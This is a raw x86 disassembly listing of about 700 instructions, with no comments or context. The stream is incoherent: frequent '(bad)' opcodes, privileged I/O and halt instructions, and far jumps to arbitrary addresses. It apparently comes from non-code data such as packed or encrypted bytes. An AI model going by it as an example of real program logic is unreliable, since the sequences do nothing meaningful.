  44a176:	loopne 0x44a1c4
  44a178:	clc    
  44a179:	sub    eax,DWORD PTR [esi-0x51]
  44a17c:	mov    dh,BYTE PTR [edi-0x20]
  44a17f:	rol    BYTE PTR [ebx-0x593f0395],cl
  44a185:	outs   dx,DWORD PTR ds:[esi]
  44a186:	faddp  st(6),st
  44a188:	sbb    eax,0xa3828a0e
  44a18d:	dec    edx
  44a18e:	lea    ecx,ds:0x50eb2a00
  44a194:	ins    DWORD PTR es:[edi],dx
  44a195:	stc    
  44a196:	lods   al,BYTE PTR ds:[esi]
  44a197:	adc    ebp,ebx
  44a199:	dec    ebp
  44a19a:	retf   
  44a19b:	sub    eax,0x64bb67f8
  44a1a0:	ret    
  44a1a1:	cmc    
  44a1a2:	mov    ds:0x71449375,al
  44a1a7:	mov    ?,WORD PTR [esi-0x67902904]
  44a1ad:	cld    
  44a1ae:	push   ecx
  44a1af:	mov    WORD PTR [ecx+0x25],fs
  44a1b2:	jb     0x44a1f8
  44a1b4:	xor    al,0x27
  44a1b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a1b7:	dec    edi
  44a1b8:	mov    esi,0xdf7eb10c
  44a1bd:	xor    BYTE PTR [ebp+0x33d464ae],dl
  44a1c3:	inc    eax
  44a1c4:	and    BYTE PTR [eax+0x16],ah
  44a1c7:	mov    cl,0x1c
  44a1c9:	mov    ds:0x2545b8a9,al
  44a1ce:	stc    
  44a1cf:	jmp    0x4916:0xafecb008
  44a1d6:	pusha  
  44a1d7:	pushf  
  44a1d8:	mov    esp,0x5ae91fbd
  44a1dd:	xchg   BYTE PTR [edi-0x6a],cl
  44a1e0:	retf   
  44a1e1:	cs jns 0x44a1a9
  44a1e4:	pop    ecx
  44a1e5:	jae    0x44a1b2
  44a1e7:	scas   al,BYTE PTR es:[edi]
  44a1e8:	cmp    edx,DWORD PTR [ecx-0x798f214d]
  44a1ee:	mov    ecx,0xe64c5a7b
  44a1f3:	popa   
  44a1f4:	jb     0x44a204
  44a1f6:	mov    cl,0xf6
  44a1f8:	(bad)  
  44a1f9:	iret   
  44a1fa:	in     eax,0x9d
  44a1fc:	pop    ebp
  44a1fd:	mov    bh,0xbd
  44a1ff:	mov    DWORD PTR [ebx],esi
  44a201:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a202:	shr    DWORD PTR [ebp+ecx*1+0x62bcf2e8],1
  44a209:	mov    cl,0x39
  44a20b:	mov    ah,0x8d
  44a20d:	pop    ds
  44a20e:	sar    DWORD PTR [ecx+eiz*4],1
  44a211:	div    esp
  44a213:	fistp  DWORD PTR [esi+esi*2+0x264a2e78]
  44a21a:	sub    eax,0xb04dab93
  44a21f:	jnp    0x44a1d2
  44a221:	jmp    FWORD PTR [ebx-0x18]
  44a224:	inc    edx
  44a225:	(bad)  
  44a227:	out    0x57,al
  44a229:	scas   eax,DWORD PTR es:[edi]
  44a22a:	mov    esi,0xea18fec8
  44a22f:	jo     0x44a249
  44a231:	sbb    ch,ch
  44a233:	jo     0x44a233
  44a235:	das    
  44a236:	hlt    
  44a237:	cmp    dh,BYTE PTR [eax+eiz*8-0xaa1c215]
  44a23e:	cmc    
  44a23f:	imul   edx,DWORD PTR [esi-0x21707c6a],0x33
  44a246:	adc    eax,0xe4c529c9
  44a24b:	aaa    
  44a24c:	nop
  44a24d:	jae    0x44a237
  44a24f:	adc    ebp,0x79
  44a252:	push   edx
  44a253:	(bad)  
  44a254:	pop    esp
  44a255:	push   ss
  44a256:	fist   DWORD PTR [esi-0x43]
  44a259:	push   edx
  44a25a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a25b:	or     edi,0x196178ea
  44a261:	in     al,dx
  44a262:	xchg   BYTE PTR [esp+ebx*8-0x8],ch
  44a266:	pop    ebx
  44a267:	mov    bl,0x83
  44a269:	cmp    BYTE PTR [ecx-0x18ec59ed],ah
  44a26f:	aam    0x1c
  44a271:	lahf   
  44a272:	dec    ebp
  44a273:	pop    eax
  44a274:	retf   
  44a275:	xchg   esi,eax
  44a276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a277:	shr    BYTE PTR [ecx-0x640e786e],1
  44a27d:	add    edi,0x15138aa5
  44a283:	jmp    0xa7a10873
  44a288:	call   edi
  44a28a:	sub    ah,BYTE PTR [ecx+eiz*4+0x1d]
  44a28e:	(bad)  
  44a28f:	mov    ds:0xe6e84242,al
  44a294:	mov    cl,0x29
  44a296:	jle    0x44a21d
  44a298:	mov    ah,0x3e
  44a29a:	aad    0xc2
  44a29c:	mov    es,WORD PTR [edx+0x62]
  44a29f:	pusha  
  44a2a0:	mov    eax,0x528c01d0
  44a2a5:	mov    bh,0xb
  44a2a7:	mov    al,ds:0x95a96cf9
  44a2ac:	cld    
  44a2ad:	lods   al,BYTE PTR ds:[esi]
  44a2ae:	ret    0x1b75
  44a2b1:	inc    eax
  44a2b2:	popa   
  44a2b3:	test   DWORD PTR [ebx+0x75],0xee39fd71
  44a2ba:	call   0x2a45a575
  44a2bf:	cmp    ebx,DWORD PTR [eax-0x5b]
  44a2c2:	and    bl,BYTE PTR [ebp-0x1a]
  44a2c5:	dec    edx
  44a2c6:	call   0xad8d246f
  44a2cb:	xor    esi,DWORD PTR ds:0x9e1e10d0
  44a2d1:	pop    ss
  44a2d2:	xor    DWORD PTR [esi],ecx
  44a2d4:	mov    cl,0xd1
  44a2d6:	dec    ebx
  44a2d7:	mov    esp,0xcebfa9f3
  44a2dc:	addr16 xor cl,cl
  44a2df:	sbb    esi,DWORD PTR [edi+eiz*4+0x1f54ca71]
  44a2e6:	adc    ah,0x28
  44a2e9:	cmp    BYTE PTR [ecx+0x18],ah
  44a2ec:	pop    ss
  44a2ed:	call   DWORD PTR [edi]
  44a2ef:	ret    0xd678
  44a2f2:	sbb    esp,DWORD PTR [ebx]
  44a2f4:	xchg   ebp,eax
  44a2f5:	call   0xb9d4:0xc6872049
  44a2fc:	cmp    ch,ah
  44a2fe:	inc    edx
  44a2ff:	clc    
  44a300:	repz scas eax,DWORD PTR es:[edi]
  44a302:	mov    dh,0x22
  44a304:	iret   
  44a305:	xlat   BYTE PTR ds:[ebx]
  44a306:	shl    BYTE PTR [esi+0x1d],0xa8
  44a30a:	and    DWORD PTR ss:[edi+0x2a33d5e1],esp
  44a311:	mov    cl,0x8e
  44a313:	je     0x44a32b
  44a315:	jmp    0xc7711a4
  44a31a:	pop    esi
  44a31b:	inc    edi
  44a31c:	push   esi
  44a31d:	leave  
  44a31e:	test   al,0xe
  44a320:	scas   al,BYTE PTR es:[edi]
  44a321:	movq   QWORD PTR [ebx],mm2
  44a324:	cli    
  44a325:	fdivr  st,st(3)
  44a327:	mov    ah,0xc7
  44a329:	imul   esp,DWORD PTR [ecx],0xffffffad
  44a32c:	jp     0x44a2d8
  44a32e:	ror    DWORD PTR [edx],1
  44a330:	sbb    DWORD PTR [edx+0x2be85789],0x60430ba3
  44a33a:	hlt    
  44a33b:	sub    ebp,DWORD PTR [eax-0x2b2aaccc]
  44a341:	iret   
  44a342:	jb     0x44a390
  44a344:	psubb  mm7,QWORD PTR [esi]
  44a347:	jle    0x44a3b0
  44a349:	mov    ah,0x5a
  44a34b:	sti    
  44a34c:	cmp    al,0xc2
  44a34e:	push   ebx
  44a34f:	sbb    BYTE PTR [edx+eax*1-0x99785b4],cl
  44a356:	mov    dl,0xf5
  44a358:	mov    ds:0x2852fbf2,eax
  44a35d:	add    al,0xef
  44a35f:	push   ecx
  44a360:	bnd jo 0x44a2e6
  44a363:	add    DWORD PTR [ecx],ebp
  44a365:	xchg   cl,dl
  44a367:	xlat   BYTE PTR ds:[ebx]
  44a368:	mov    eax,0x5c38fa3f
  44a36d:	mov    BYTE PTR [ecx-0x4ba1bb26],ah
  44a373:	xchg   esp,eax
  44a374:	(bad)  
  44a375:	mov    eax,ds:0x8cb8b87e
  44a37a:	fwait
  44a37b:	or     BYTE PTR [eax+0x3c206120],0x8b
  44a382:	retf   
  44a383:	std    
  44a384:	dec    esi
  44a385:	xor    dl,BYTE PTR [edx-0x4331b14f]
  44a38b:	shr    BYTE PTR [edi+0x3c],0xb5
  44a38f:	scas   eax,DWORD PTR es:[edi]
  44a390:	sub    esi,0x82898f33
  44a396:	mov    bl,0x21
  44a398:	mov    ds:0xbb999045,eax
  44a39d:	mov    al,ds:0x2b814ba7
  44a3a2:	outs   dx,DWORD PTR ds:[esi]
  44a3a3:	adc    eax,0xa2360133
  44a3a8:	loope  0x44a335
  44a3aa:	adc    al,BYTE PTR [edx+0x5b]
  44a3ad:	cmp    eax,DWORD PTR [ecx+0x26d61f7d]
  44a3b3:	pop    edx
  44a3b4:	cmp    al,0xd0
  44a3b6:	sbb    eax,0x898831d9
  44a3bb:	and    al,0xc4
  44a3bd:	sbb    ecx,DWORD PTR [esi+0x37788a86]
  44a3c3:	pop    ebp
  44a3c4:	inc    edx
  44a3c5:	dec    esp
  44a3c6:	push   ebx
  44a3c7:	sub    BYTE PTR [ecx],0xd5
  44a3ca:	sub    esp,DWORD PTR [edi+0x4f2c543d]
  44a3d0:	mov    cl,0x48
  44a3d2:	jbe    0x44a387
  44a3d4:	out    dx,al
  44a3d5:	sbb    bl,BYTE PTR [esi-0x7]
  44a3d8:	xchg   ebx,eax
  44a3d9:	inc    edi
  44a3da:	fnsave [esi+0xe]
  44a3dd:	dec    ebx
  44a3de:	mov    ah,0xd6
  44a3e0:	outs   dx,BYTE PTR ds:[esi]
  44a3e1:	fisub  WORD PTR [eax+0x47ddedb2]
  44a3e7:	inc    edx
  44a3e8:	lahf   
  44a3e9:	call   0x875d401e
  44a3ee:	retf   0xbe1e
  44a3f1:	add    edi,DWORD PTR [edi+ebp*4-0x37]
  44a3f5:	imul   esi,DWORD PTR [ebx+0x6ec9a11f],0x80d2163
  44a3ff:	sbb    ch,cl
  44a401:	ds aam 0xd6
  44a404:	(bad)  
  44a405:	dec    ebp
  44a406:	sub    DWORD PTR [eax+0x73],esi
  44a409:	pop    ecx
  44a40a:	jl     0x44a3f3
  44a40c:	clc    
  44a40d:	stos   BYTE PTR es:[edi],al
  44a40e:	push   esp
  44a40f:	jnp    0x44a47a
  44a411:	sub    al,0x5
  44a413:	sub    dl,dh
  44a415:	pop    ebp
  44a416:	jg     0x44a3d6
  44a418:	frndint 
  44a41a:	jmp    0xd8df:0x6163843a
  44a421:	push   esp
  44a422:	imul   eax,ebx,0xc6007c8a
  44a428:	xor    bl,BYTE PTR [eax+esi*8-0x4cb72285]
  44a42f:	adc    DWORD PTR [edi+eax*1+0x48e1bf17],esi
  44a436:	sbb    BYTE PTR [ebp-0x62],ch
  44a439:	xlat   BYTE PTR ds:[ebx]
  44a43a:	aam    0x5a
  44a43c:	mov    edx,0xd666b67a
  44a441:	aaa    
  44a442:	mov    ebx,esp
  44a444:	in     eax,0x72
  44a446:	sbb    BYTE PTR [eax+0x3a],dh
  44a449:	and    eax,0x2cbea047
  44a44e:	jo     0xf13431ef
  44a454:	xchg   esi,eax
  44a455:	push   edx
  44a456:	shl    DWORD PTR [edx],0x91
  44a459:	push   edx
  44a45a:	xchg   dl,al
  44a45c:	xchg   ecx,eax
  44a45d:	cdq    
  44a45e:	and    eax,0x54a89b4d
  44a463:	jae    0x44a473
  44a465:	fldcw  WORD PTR [eax+0x3b]
  44a468:	jg     0x44a43f
  44a46a:	sbb    edx,DWORD PTR [esi+eax*8-0x1cee74b0]
  44a471:	cmp    ch,0xee
  44a474:	pop    edx
  44a475:	dec    ebx
  44a476:	inc    ecx
  44a477:	ror    DWORD PTR [esi+0x14ba2b4a],cl
  44a47d:	inc    esp
  44a47e:	dec    esp
  44a47f:	in     eax,0x7a
  44a481:	and    ah,BYTE PTR [eax+0x75c1c771]
  44a487:	and    DWORD PTR ds:0x86b95d41,esi
  44a48d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a48e:	cli    
  44a48f:	fild   DWORD PTR [ebp+0x32b5a4ce]
  44a495:	mov    eax,0x8612d524
  44a49a:	in     al,dx
  44a49b:	or     al,ch
  44a49d:	ja     0x44a45b
  44a49f:	push   0xffffffd2
  44a4a1:	xchg   edi,eax
  44a4a2:	mov    ah,0x32
  44a4a4:	test   eax,0x72b36c69
  44a4a9:	faddp  st(5),st
  44a4ab:	sub    edx,DWORD PTR [edi+0x1db310e4]
  44a4b1:	out    0x2c,al
  44a4b3:	pop    edx
  44a4b4:	retf   
  44a4b5:	or     DWORD PTR [ecx],ecx
  44a4b7:	pop    edx
  44a4b8:	sahf   
  44a4b9:	or     eax,0xbee16cb9
  44a4be:	add    DWORD PTR [esi+0x4ee9ba84],ebp
  44a4c4:	stos   BYTE PTR es:[edi],al
  44a4c5:	aam    0xd7
  44a4c7:	push   esi
  44a4c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a4c9:	jge    0x44a4db
  44a4cb:	pop    ss
  44a4cc:	pop    ss
  44a4cd:	pop    ds
  44a4ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a4cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a4d0:	bound  ebp,QWORD PTR [ebx]
  44a4d2:	lea    edx,[edi+0x61320624]
  44a4d8:	xchg   BYTE PTR [ebx-0x47],dl
  44a4db:	push   0xffffffe3
  44a4dd:	xchg   ebp,eax
  44a4de:	or     al,0x11
  44a4e1:	jae    0x44a4ea
  44a4e3:	int3   
  44a4e4:	jbe    0x44a4cd
  44a4e6:	inc    ecx
  44a4e7:	adc    al,0x1c
  44a4e9:	push   eax
  44a4ea:	mov    edx,0xa96a6358
  44a4ef:	lahf   
  44a4f0:	push   eax
  44a4f1:	ret    
  44a4f2:	addr16 or al,0xd9
  44a4f5:	popa   
  44a4f6:	push   ebp
  44a4f7:	rol    BYTE PTR [ebx-0x6a8c0d6d],1
  44a4fd:	lds    edi,FWORD PTR [edx+0x65bb68dc]
  44a503:	(bad)  
  44a505:	pop    ss
  44a506:	push   edi
  44a507:	sub    bh,ah
  44a509:	sti    
  44a50a:	inc    edx
  44a50b:	and    BYTE PTR [ebx*1+0x263f5087],0xde
  44a513:	sub    ebx,DWORD PTR [esi-0x4222c2d2]
  44a519:	inc    edi
  44a51a:	das    
  44a51b:	fdivr  DWORD PTR [ebp-0x59]
  44a51e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a51f:	fxch   st(3)
  44a521:	mov    bh,0xc9
  44a523:	xchg   edi,eax
  44a524:	jo     0x44a564
  44a526:	sbb    DWORD PTR [eax-0x27],ebx
  44a529:	sar    DWORD PTR [eax+0x53],1
  44a52c:	jne    0x44a4c6
  44a52e:	fwait
  44a52f:	sbb    eax,0xa73887df
  44a534:	mov    cl,0x40
  44a536:	or     BYTE PTR [edx+0x3a338ef6],dl
  44a53c:	push   ebx
  44a53d:	mov    edi,0xe8b046a8
  44a542:	xchg   ebp,eax
  44a543:	(bad)  
  44a544:	sbb    eax,0xab2acec8
  44a549:	and    al,0x6b
  44a54b:	sbb    esp,DWORD PTR [ebx-0x57]
  44a54e:	pop    ds
  44a54f:	push   es
  44a550:	ficom  WORD PTR [edx]
  44a552:	mov    esp,0x15f6f60
  44a557:	lds    esi,FWORD PTR [esi]
  44a559:	iret   
  44a55a:	push   0x48
  44a55c:	sub    eax,0xfa82e99f
  44a561:	bound  eax,QWORD PTR [ebx-0x67]
  44a564:	jne    0x44a543
  44a566:	sbb    al,BYTE PTR [ecx-0xc]
  44a569:	fsub   DWORD PTR [ecx]
  44a56b:	jns    0x44a573
  44a56d:	mov    ds:0x1fd5a280,eax
  44a572:	icebp  
  44a573:	push   ecx
  44a574:	rcl    DWORD PTR [edi+ebp*1-0xb],1
  44a578:	jge    0x44a5a6
  44a57a:	loop   0x44a5f5
  44a57c:	jg     0x44a5b0
  44a57e:	(bad)  
  44a57f:	cmp    al,0x6c
  44a581:	out    dx,al
  44a582:	iret   
  44a583:	sbb    al,0x92
  44a585:	inc    ebp
  44a586:	jge    0x44a584
  44a588:	or     esi,ecx
  44a58a:	sub    ebp,DWORD PTR [edi]
  44a58c:	push   0x6f5a122e
  44a591:	xchg   edx,eax
  44a592:	call   0x2aaa4fd2
  44a597:	mov    ebx,0x51ac6fae
  44a59c:	jnp    0x44a57a
  44a59e:	stos   DWORD PTR es:[edi],eax
  44a59f:	mov    edx,0x15263d00
  44a5a4:	ret    0x998b
  44a5a7:	scas   al,BYTE PTR es:[edi]
  44a5a8:	mov    dh,bl
  44a5aa:	out    dx,eax
  44a5ab:	adc    al,0x36
  44a5ad:	mov    cl,0xb4
  44a5af:	sbb    BYTE PTR [edi+ebx*4-0x58],dl
  44a5b3:	xchg   BYTE PTR [ebx-0x624746ed],ah
  44a5b9:	inc    edi
  44a5ba:	jnp    0x44a551
  44a5bc:	stos   DWORD PTR es:[edi],eax
  44a5bd:	push   cs
  44a5be:	inc    ebx
  44a5bf:	repnz xchg dl,cl
  44a5c2:	popf   
  44a5c3:	ss sti 
  44a5c5:	sbb    ah,bl
  44a5c7:	xor    eax,0x43ef0cdc
  44a5cc:	and    al,0xbd
  44a5ce:	xor    ch,BYTE PTR [ebx+0x3bd10a4e]
  44a5d4:	out    dx,eax
  44a5d5:	jmp    0x44a56d
  44a5d7:	jp     0x44a5e5
  44a5d9:	inc    edi
  44a5da:	push   eax
  44a5db:	call   0xdf98f684
  44a5e0:	(bad)  
  44a5e1:	hlt    
  44a5e2:	addr16 pop ebx
  44a5e4:	push   0x4a
  44a5e6:	repz into 
  44a5e8:	out    dx,eax
  44a5e9:	arpl   di,sp
  44a5eb:	inc    ebp
  44a5ec:	repnz inc ecx
  44a5ee:	lahf   
  44a5ef:	mov    ds:0x12344a5e,eax
  44a5f4:	or     DWORD PTR [esi],edx
  44a5f6:	call   0xa576:0x651f09b0
  44a5fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a5fe:	js     0x44a622
  44a600:	popa   
  44a601:	jg     0x44a61e
  44a603:	out    0xe6,al
  44a605:	mov    al,ds:0xa5944df3
  44a60a:	sar    esp,cl
  44a60c:	popf   
  44a60d:	pop    ss
  44a60e:	mov    eax,0x9ff044a6
  44a613:	icebp  
  44a614:	(bad)  
  44a615:	hlt    
  44a616:	and    eax,0x59b385cc
  44a61b:	pop    esi
  44a61c:	cmc    
  44a61d:	jg     0x44a66b
  44a61f:	popa   
  44a620:	inc    esp
  44a621:	cmp    eax,0x26fef085
  44a626:	test   eax,0xd8b5050c
  44a62b:	push   edi
  44a62c:	xchg   ebp,eax
  44a62d:	xor    BYTE PTR [esi+ebx*1+0x1c],dl
  44a631:	or     al,0x33
  44a633:	rcl    BYTE PTR [ecx-0x31],0x99
  44a637:	mov    BYTE PTR [ecx+0x30c2d37],bl
  44a63d:	mov    al,ds:0x78e93669
  44a642:	out    dx,al
  44a643:	push   cs
  44a644:	popf   
  44a645:	cdq    
  44a646:	push   0xffffffa5
  44a648:	push   0xc149551e
  44a64d:	scas   eax,DWORD PTR es:[edi]
  44a64e:	cld    
  44a64f:	scas   al,BYTE PTR es:[edi]
  44a650:	mov    DWORD PTR [edx],esp
  44a652:	int    0x37
  44a654:	ficomp WORD PTR [esi-0x63]
  44a657:	pop    ss
  44a658:	outs   dx,BYTE PTR ds:[esi]
  44a659:	jnp    0x44a687
  44a65b:	adc    DWORD PTR [eax],ebx
  44a65d:	stos   BYTE PTR es:[edi],al
  44a65e:	xchg   edx,eax
  44a65f:	jns    0x44a66f
  44a661:	or     BYTE PTR [esi+0x16009aff],ch
  44a667:	xchg   ebx,eax
  44a668:	push   0xc9328af4
  44a66d:	push   ss
  44a66e:	xor    ch,ah
  44a670:	outs   dx,BYTE PTR ds:[esi]
  44a671:	adc    dh,0x42
  44a674:	test   al,0x2d
  44a676:	jge    0x44a695
  44a678:	cmp    eax,DWORD PTR [eax-0x2a]
  44a67b:	std    
  44a67c:	out    dx,eax
  44a67d:	push   eax
  44a67e:	dec    edx
  44a67f:	mov    DWORD PTR [ebx-0x489c18f8],edi
  44a685:	aas    
  44a686:	pop    ecx
  44a687:	ins    BYTE PTR es:[edi],dx
  44a688:	rcl    BYTE PTR [ebp+edi*1-0x46],1
  44a68c:	cwde   
  44a68d:	out    dx,al
  44a68e:	xchg   ebx,eax
  44a68f:	scas   eax,DWORD PTR es:[edi]
  44a690:	and    BYTE PTR [edx],dh
  44a692:	inc    edi
  44a693:	and    ch,BYTE PTR [edi]
  44a695:	loope  0x44a646
  44a697:	int    0x41
  44a699:	or     ebp,ebx
  44a69b:	add    ah,BYTE PTR [eax-0x5e]
  44a69e:	out    0x82,al
  44a6a0:	jecxz  0x44a686
  44a6a2:	sbb    DWORD PTR ds:[ebp-0x6b551a8e],edi
  44a6a9:	and    bl,ch
  44a6ab:	ins    BYTE PTR es:[edi],dx
  44a6ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a6ad:	mov    BYTE PTR [edi+0x35efddee],ch
  44a6b3:	or     dl,BYTE PTR [eax]
  44a6b5:	dec    ebx
  44a6b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a6b7:	xchg   edi,eax
  44a6b8:	xchg   DWORD PTR [edi],ebp
  44a6ba:	aas    
  44a6bb:	xor    BYTE PTR [edx+eax*2],bl
  44a6be:	xchg   edx,eax
  44a6bf:	test   BYTE PTR ds:0x9eaa1386,bh
  44a6c5:	sub    eax,esi
  44a6c7:	push   es
  44a6c8:	cmp    esi,edx
  44a6ca:	and    ebx,DWORD PTR [edi+0x74766862]
  44a6d0:	pop    ebp
  44a6d1:	sbb    al,0xa0
  44a6d3:	int    0x71
  44a6d5:	stos   BYTE PTR es:[edi],al
  44a6d6:	mov    ebp,DWORD PTR [ebp+0x24e9281d]
  44a6dc:	sub    eax,0xb22f243a
  44a6e1:	sbb    dl,BYTE PTR [esi-0x5b48f77e]
  44a6e7:	popa   
  44a6e8:	jecxz  0x44a6a2
  44a6ea:	nop
  44a6eb:	push   edi
  44a6ec:	mov    WORD PTR [ecx-0x21],gs
  44a6ef:	mov    al,0xc4
  44a6f1:	iret   
  44a6f2:	outs   dx,BYTE PTR ds:[esi]
  44a6f3:	mov    dh,0x64
  44a6f5:	push   esp
  44a6f6:	hlt    
  44a6f7:	pop    es
  44a6f8:	jb     0x44a6cb
  44a6fa:	push   ss
  44a6fb:	sahf   
  44a6fc:	push   es
  44a6fd:	lods   al,BYTE PTR ds:[esi]
  44a6fe:	aas    
  44a6ff:	(bad)  
  44a701:	jno    0x44a742
  44a703:	in     eax,0xa5
  44a705:	jle    0x44a753
  44a707:	hlt    
  44a708:	in     al,0xd4
  44a70a:	mov    ah,0xab
  44a70c:	adc    DWORD PTR ds:0x16368279,esp
  44a712:	lahf   
  44a713:	shr    BYTE PTR [ecx],cl
  44a715:	jge    0x44a6b5
  44a717:	pusha  
  44a718:	sub    BYTE PTR [edi+0x3d025633],bl
  44a71e:	dec    eax
  44a71f:	fsub   st(6),st
  44a721:	sbb    BYTE PTR [ebx-0x38],al
  44a724:	(bad)  
  44a725:	xor    al,0x6b
  44a727:	inc    edi
  44a728:	call   0x9eef:0x94ad4a45
  44a72f:	push   edx
  44a730:	arpl   WORD PTR [eax],bx
  44a732:	push   ds
  44a733:	(bad)  
  44a734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a736:	pop    edx
  44a737:	mov    WORD PTR [edi+ecx*1-0x59de9e88],cs
  44a73e:	sbb    eax,DWORD PTR [edx+0x51cae739]
  44a744:	mov    bl,0xfa
  44a746:	mov    cl,0x4d
  44a748:	test   al,0x5a
  44a74a:	les    ecx,FWORD PTR [edx-0x76]
  44a74d:	inc    edx
  44a74e:	unpckhps xmm0,XMMWORD PTR [ebp-0x51]
  44a752:	inc    edi
  44a753:	or     DWORD PTR [eax+eax*2-0x4],eax
  44a757:	retf   
  44a758:	mov    WORD PTR [edx-0x2c],gs
  44a75b:	and    eax,0x96c0f0c
  44a760:	scas   al,BYTE PTR es:[edi]
  44a761:	xlat   BYTE PTR ds:[ebx]
  44a762:	dec    eax
  44a763:	dec    esi
  44a764:	shl    DWORD PTR [eax-0x43],cl
  44a767:	mov    edx,0x19e060d
  44a76c:	mov    al,ds:0x79916b3c
  44a771:	mov    ebp,ecx
  44a773:	push   0xc44534d4
  44a778:	adc    ebp,DWORD PTR [ecx+ebp*4-0x1a]
  44a77c:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  44a77e:	pop    edi
  44a77f:	or     DWORD PTR [edi+0x75],ecx
  44a782:	fwait
  44a783:	stos   DWORD PTR es:[edi],eax
  44a784:	pop    edx
  44a785:	xchg   esp,eax
  44a786:	call   0xb5f7ae4a
  44a78b:	jb     0x44a7d7
  44a78d:	loop   0x44a76e
  44a78f:	lock sub DWORD PTR [edi],0xc
  44a793:	pop    esp
  44a794:	lods   al,BYTE PTR ds:[esi]
  44a795:	mov    edx,0x723eefbe
  44a79a:	ror    BYTE PTR [ecx-0x3d0ac00],0xea
  44a7a1:	and    al,ah
  44a7a3:	xchg   esp,eax
  44a7a4:	add    al,0x0
  44a7a6:	dec    ebx
  44a7a7:	xchg   edi,eax
  44a7a8:	inc    edx
  44a7a9:	(bad)  
  44a7ab:	scas   al,BYTE PTR es:[edi]
  44a7ac:	xchg   edx,eax
  44a7ad:	daa    
  44a7ae:	hlt    
  44a7af:	adc    DWORD PTR ds:0x6f3dabbb,0x4c13dfd9
  44a7b9:	push   esp
  44a7ba:	add    DWORD PTR [esi+0x419859c3],0x6b001166
  44a7c4:	jmp    0x7c7b24c6
  44a7c9:	xchg   esi,eax
  44a7ca:	sbb    eax,0xb5d285be
  44a7cf:	xor    edx,DWORD PTR [ecx+0x10bf13a1]
  44a7d5:	sub    cl,BYTE PTR [ebx-0x27]
  44a7d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a7d9:	aam    0x32
  44a7db:	jae    0x44a849
  44a7dd:	adc    bl,BYTE PTR [ecx]
  44a7df:	push   0x23b0f01e
  44a7e4:	add    eax,0xb819ecd7
  44a7e9:	retf   0x5d6c
  44a7ec:	add    ebp,esp
  44a7ee:	bound  esp,QWORD PTR [eax-0x1c]
  44a7f1:	daa    
  44a7f2:	mov    dl,BYTE PTR [ecx]
  44a7f4:	mov    bl,0xba
  44a7f6:	mov    ds:0x916d89e3,al
  44a7fb:	in     eax,dx
  44a7fc:	fidiv  WORD PTR [ebx]
  44a7fe:	les    edx,FWORD PTR [ebp+0x6b7a82d6]
  44a804:	cmp    al,0x58
  44a806:	pop    es
  44a807:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a809:	sub    eax,0xc79194a3
  44a80e:	js     0x44a7bc
  44a810:	adc    BYTE PTR [ecx-0x292116c8],dl
  44a816:	mov    esp,0xc268a7e4
  44a81b:	mov    dh,0x2
  44a81d:	fwait
  44a81e:	mov    dl,0xee
  44a820:	cwde   
  44a821:	ins    BYTE PTR es:[edi],dx
  44a822:	mov    WORD PTR [esi],ds
  44a824:	ins    BYTE PTR es:[edi],dx
  44a825:	push   eax
  44a826:	dec    edi
  44a827:	jp     0x44a81d
  44a829:	mov    ds:0x22f62d6a,al
  44a82e:	cs jo  0x44a7ce
  44a831:	mov    al,ds:0x727993ce
  44a836:	ss pop eax
  44a838:	push   esi
  44a839:	sahf   
  44a83a:	addr16 jge 0x44a8ae
  44a83d:	cmp    esi,DWORD PTR [edx-0x8]
  44a840:	je     0x44a891
  44a842:	sub    DWORD PTR [ecx],edi
  44a844:	cli    
  44a845:	pusha  
  44a846:	inc    esp
  44a847:	jl     0x44a7ff
  44a849:	or     al,0x45
  44a84b:	stos   BYTE PTR es:[edi],al
  44a84c:	(bad)  
  44a84d:	idiv   DWORD PTR [esi+0x34]
  44a850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a851:	fnstenv [eax-0x211b095e]
  44a857:	es (bad) 
  44a859:	fidivr WORD PTR [edi+0x71]
  44a85c:	mov    bh,0x12
  44a85e:	shl    DWORD PTR [ebp+ebp*2+0x25],cl
  44a862:	xchg   esi,eax
  44a863:	add    DWORD PTR [edx+0x67],0x2862d454
  44a86a:	rcr    BYTE PTR [edi-0x5a],cl
  44a86d:	je     0x44a81a
  44a86f:	loopne 0x44a835
  44a871:	leave  
  44a872:	push   edi
  44a873:	pop    ebx
  44a874:	jmp    0x44a8d5
  44a876:	fild   QWORD PTR [ebx-0x7a388c21]
  44a87c:	fild   WORD PTR [ebx+0xe0b77ae]
  44a882:	fnsave [edi+0x1cffa188]
  44a888:	enter  0x90bf,0x86
  44a88c:	xor    bh,dl
  44a88e:	push   ds
  44a88f:	and    ebp,eax
  44a891:	add    esp,eax
  44a893:	pusha  
  44a894:	or     BYTE PTR [edx-0x413b455f],bh
  44a89a:	or     al,0xf9
  44a89c:	cmp    BYTE PTR [esi-0x69d750fb],ch
  44a8a2:	or     bh,BYTE PTR [eax-0x40b0020f]
  44a8a8:	mov    ds:0xbc4f7874,al
  44a8ad:	add    dl,BYTE PTR [ebx-0x24]
  44a8b0:	add    BYTE PTR [esp+edi*1+0x64326c91],0x85
  44a8b8:	ret    
  44a8b9:	retf   0xd715
  44a8bc:	xchg   ecx,eax
  44a8bd:	adc    eax,DWORD PTR [eax-0x6fd5a8e2]
  44a8c3:	(bad)  
  44a8c5:	push   ecx
  44a8c6:	dec    ebx
  44a8c7:	pop    edi
  44a8c8:	dec    edx
  44a8c9:	jbe    0x44a936
  44a8cb:	dec    ebx
  44a8cc:	cmp    BYTE PTR [esi+0x48],al
  44a8cf:	cmp    DWORD PTR [eax-0x3e],esp
